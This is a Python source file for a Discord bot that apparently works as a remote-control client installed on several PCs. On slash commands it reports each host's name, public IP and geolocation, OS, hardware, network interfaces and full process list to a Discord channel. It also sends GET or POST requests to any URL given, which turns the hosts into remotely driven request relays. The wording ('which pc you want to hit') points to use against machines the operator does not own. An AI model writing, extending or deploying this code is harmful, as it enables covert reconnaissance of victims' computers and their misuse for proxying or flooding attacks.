import discord
from discord import File
import io
from discord import app_commands
from discord.ext import commands
import socket,os,time
import requests,psutil,platform
from PIL import Image, ImageDraw, ImageFont

bot = commands.Bot(command_prefix="!",intents= discord.Intents.all())
token = ""

#VARIABLES
PC_NAME = socket.gethostname()
#-------------------------------------------------------------------------------------------------------------------
class utils:
    def gather__info():
        info = {}
    
        # System Information
        info['system'] = f'{platform.system()} {platform.release()} {platform.machine()}'
        
        # Hostname
        info['hostname'] = socket.gethostname()
        
        # CPU Information
        info['cpu_info'] = platform.processor()
        
        # Memory Information
        mem_info = psutil.virtual_memory()
        info['memory_info'] = {
            'total': round(mem_info.total / (1024.0 ** 3), 2),
            'available': round(mem_info.available / (1024.0 ** 3), 2)
        }
        
        # Disk Usage
        disk_usage = psutil.disk_usage('/')
        info['disk_usage'] = {
            'total': round(disk_usage.total / (1024.0 ** 3), 2),
            'used': round(disk_usage.used / (1024.0 ** 3), 2),
            'free': round(disk_usage.free / (1024.0 ** 3), 2)
        }
        
        # Network Interfaces
        net_info = psutil.net_if_addrs()
        interfaces = {}
        for interface, addresses in net_info.items():
            interface_addresses = []
            for address in addresses:
                if address.family == socket.AF_INET:
                    interface_addresses.append({'type': 'ipv4', 'address': address.address})
                elif address.family == socket.AF_INET6:
                    interface_addresses.append({'type': 'ipv6', 'address': address.address})
            interfaces[interface] = interface_addresses
        info['network_interfaces'] = interfaces
        
        # System Load
        load_avg = psutil.getloadavg()
        info['system_load'] = {
            '1m': round(load_avg[0], 2),
            '5m': round(load_avg[1], 2),
            '15m': round(load_avg[2], 2)
        }
        
        # Processes
        processes = psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent'])
        process_list = []
        for process in processes:
            try:
                process_info = process.info
                process_list.append({
                    'pid': process_info['pid'],
                    'name': process_info['name'],
                    'username': process_info['username'],
                    'cpu_percent': round(process_info['cpu_percent'], 2),
                    'memory_percent': round(process_info['memory_percent'], 2)
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        info['processes'] = process_list
        
        return info
    
    def img_from_dict(data:dict):
        img = Image.open("textback.png").convert('RGBA')
 
        # Create drawing object
        draw = ImageDraw.Draw(img)

        # Get height
        width, height = img.size
        ## Define font
        font = ImageFont.truetype("DataFont.ttf",24)
        fonttitle = ImageFont.truetype("DataFont.ttf",40)

        print((width / 2) -130)
        draw.text((242,60),f'Device_Name:{PC_NAME}',fill=(255,255,255),font=fonttitle)
        # Draw text
        
        y_pos = 500
        outline_colors = [(255, 0, 0), (0, 255, 0), (0, 0, 255)]
        offsets = [(-1, -1), (-1, 1), (1, -1), (1, 1)]
        for key, value in data.items():
            

            # Draw text with outline
            for o in offsets:
                for c in outline_colors:
                    draw.text((50    + o[0], y_pos + o[1]),f'{key}: {value}', font=font, fill=c)
            print(y_pos)
            draw.text((50, y_pos),f'{key}: {value}',fill=(255,255,255),font=font)
            y_pos += 30
        img.save("TEXT.png")
        return img

#---------------------------------------------------------------------------------------------------------------------
@bot.event
async def on_ready():
    print("bot is up")
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} Commands")
    except Exception as e:
        print(e)
    
@bot.tree.command(name='show_names')
async def sendname(interaction:discord.Interaction):
    await interaction.response.send_message(f"NAME:{PC_NAME}")

@bot.tree.command(name="get_ip")
@app_commands.describe(pc="which pc you want to hit")
async def get_ip(interaction:discord.Interaction,pc:str="all"):
    if str(pc).strip() == PC_NAME or str(pc).strip() == "all":
        try:
            r = requests.get("https://ipinfo.io/json")
            data = r.json()
            embed = discord.Embed(
            title="IP Information",
            description=f"Here is the IP information for {data['ip']}:",
            color=discord.Color.green()
            )

            embed.add_field(name="Hostname", value=data['hostname'], inline=False)
            embed.add_field(name="City", value=data['city'], inline=True)
            embed.add_field(name="Region", value=data['region'], inline=True)
            embed.add_field(name="Country", value=data['country'], inline=True)
            embed.add_field(name="Location", value=data['loc'], inline=True)
            embed.add_field(name="Organization", value=data['org'], inline=False)
            embed.add_field(name="Timezone", value=data['timezone'], inline=True)
            await interaction.response.send_message(embed=embed) 
        except Exception as e:
           await interaction.response.send_message(f"Error Happened failed to compile to embed {e}")

@bot.tree.command(name='gather_sys_info')
@app_commands.describe(pc="which pc you want to hit")
async def info(interaction:discord.Interaction,pc:str="all"):
    #try:
            #os.remove("TEXT.png")
    #except:
    #        pass
    if str(pc).strip() == PC_NAME or str(pc).strip() == "all":
        img = utils.img_from_dict(utils.gather__info())
        b = io.BytesIO(img.tobytes())
        file = File(fp=b,filename="Text.png")
        await interaction.response.send_message(file=file)
        try:
            os.remove("TEXT.png")
        except:
            pass 

@bot.tree.command(name='web_request')
@app_commands.describe(pc="what pc you want to get his address")
async def info(interaction:discord.Interaction,site:str,type:str,pc:str="all"):
    if str(pc).strip() == PC_NAME or str(pc).strip() == "all":
        if type == "get":
            try:
                r = requests.get(site)
                text = r.text
                status = r.status_code
                embed = discord.Embed(title="request info",
                description=f"PCNAME:{PC_NAME}",
                color=discord.Color.green())
                embed.add_field(name="Status_Code",value=status,inline=False)
                embed.add_field(name="response_body",value=text,inline=False)
                await interaction.response.send_message(embed=embed)

            except Exception as e:
                await interaction.response.send_message(f"Error {e}")
        
        elif type == "post":
            try:
                r = requests.post(site)
                text = r.text
                status = r.status_code
                embed = discord.Embed(title="request info",
                description=f"here is the request info forom {PC_NAME}",
                color=discord.Color.green())
                embed.add_field(name="Status_Code",value=status,inline=False)
                embed.add_field(name="response_body",value=text,inline=False)
                await interaction.response.send_message(embed=embed)

            except Exception as e:
                await interaction.response.send_message(f"Error {e}")




bot.run(token)